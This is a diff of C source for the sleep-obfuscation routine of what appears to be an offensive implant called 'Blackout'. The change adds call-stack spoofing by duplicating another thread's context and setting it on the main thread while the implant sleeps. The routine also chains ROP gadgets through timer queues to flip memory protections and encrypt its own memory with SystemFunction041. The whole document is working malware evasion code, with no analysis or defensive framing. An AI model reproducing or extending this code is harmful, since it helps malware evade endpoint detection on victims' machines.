@@ -25,7 +25,12 @@ FUNC VOID TimerObf(
 ) {
     BLACKOUT_INSTANCE
 
-    ULONG  Status  = 0;
+    UINT32 Status           = 0;
+    
+    UINT32 DupThreadId      = bkThreadEnum();
+    HANDLE DupThreadHandle  = NULL;
+    HANDLE MainThreadHandle = NULL;
+
     HANDLE Queue   = NULL;
     HANDLE EvtTmr  = NULL;
     HANDLE EvtStrt = NULL;
@@ -33,18 +38,18 @@ FUNC VOID TimerObf(
     HANDLE Timer   = NULL;
 
     PVOID OldProt = NULL;
-    ULONG Dly = 0;
-
+    ULONG Dly     = 0;
 
     CONTEXT CtxMain = { 0 };
     CONTEXT CtxSpf  = { 0 };
+    CONTEXT CtxBkp  = { 0 };
     UINT16  ict     = 0;
 #ifdef BK_STOMP
-    CONTEXT Ctx[9] = { 0 };
-    ict     = 9;
+    CONTEXT Ctx[12] = { 0 };
+    ict     = 12;
 #else
-    CONTEXT Ctx[7]  = { 0 };
-    ict     = 7;
+    CONTEXT Ctx[10]  = { 0 };
+    ict     = 10;
 #endif
     UINT16 ic = 0;
 
@@ -62,8 +67,13 @@ FUNC VOID TimerObf(
     BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n",   Blackout().RxRegion.Base, Blackout().RxRegion.Length );
     BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );
 
+    BK_PRINT( "[OBF] Thread Id to duplicate: %d\n", DupThreadId );
     BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().SleepObf.JmpGadget );
     BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().SleepObf.NtContinueGadget );
+
+    Status = bkThreadOpen( THREAD_ALL_ACCESS, FALSE, DupThreadId, &DupThreadHandle );
+
+    Status = Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 );
 
     Status = Instance()->Win32.NtCreateEvent( &EvtTmr,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
     Status = Instance()->Win32.NtCreateEvent( &EvtStrt, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
@@ -81,6 +91,10 @@ FUNC VOID TimerObf(
     Status = Instance()->Win32.NtWaitForSingleObject( EvtTmr, FALSE, FALSE ); 
     if ( Status != 0 ) goto _Leave;
 
+    CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;
+
+    Instance()->Win32.NtGetContextThread( DupThreadHandle, &CtxSpf );
+
     for ( INT i = 0; i < ict; i++ ) {
         MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
         Ctx[i].Rsp -= sizeof( PVOID );
@@ -91,6 +105,18 @@ FUNC VOID TimerObf(
     Ctx[ic].Rcx = EvtStrt;
     Ctx[ic].Rdx = INFINITE;
     Ctx[ic].R8  = NULL;
+    ic++;
+
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtGetContextThread;
+    Ctx[ic].Rcx = MainThreadHandle;
+    Ctx[ic].Rdx = &CtxBkp;
+    ic++;
+
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtSetContextThread;
+    Ctx[ic].Rcx = MainThreadHandle;
+    Ctx[ic].Rdx = &CtxSpf;
     ic++;
 
     if ( Blackout().Stomp.Backup ) {
@@ -120,6 +146,7 @@ FUNC VOID TimerObf(
         Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
         ic++;
     } else {
+
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
         Ctx[ic].Rcx = Blackout().RxRegion.Base;
@@ -135,7 +162,7 @@ FUNC VOID TimerObf(
         ic++;
     }
 
-    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;;
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
     Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
     Ctx[ic].Rcx = NtCurrentProcess();
     Ctx[ic].Rdx = SleepTime;
@@ -143,6 +170,7 @@ FUNC VOID TimerObf(
     ic++;
 
     if ( Blackout().Stomp.Backup ) {
+
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
         Ctx[ic].Rcx = Blackout().Region.Base;
@@ -172,6 +200,7 @@ FUNC VOID TimerObf(
         Ctx[ic].R9  = &OldProt;
         ic++; 
     } else {
+
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
         Ctx[ic].Rcx = Blackout().Region.Base;
@@ -188,11 +217,17 @@ FUNC VOID TimerObf(
     }
 
     Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtSetContextThread;
+    Ctx[ic].Rcx = MainThreadHandle;
+    Ctx[ic].Rdx = &CtxBkp;
+    ic++;
+
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
     Ctx[ic].Rbx = &Instance()->Win32.SetEvent;
     Ctx[ic].Rcx = EvtEnd;
     ic++;
 
-    for ( INT i = 0; i < ict; i++ ) {
+    for ( INT i = 0; i < ic; i++ ) {
         Instance()->Win32.RtlCreateTimer( Queue, &Timer, Blackout().SleepObf.NtContinueGadget, &Ctx[i], Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
     }
 
